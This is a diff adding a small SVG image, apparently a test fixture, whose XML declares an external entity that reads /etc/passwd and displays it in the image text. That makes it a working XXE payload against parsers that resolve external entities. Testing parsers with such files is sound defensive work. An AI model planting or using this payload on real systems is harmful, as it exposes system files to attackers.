@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg height="200" width="300" xmlns="http://www.w3.org/2000/svg">
+    <text x="10" y="20" font-size="10" fill="black">
+        &xxe;
+    </text>
+</svg>
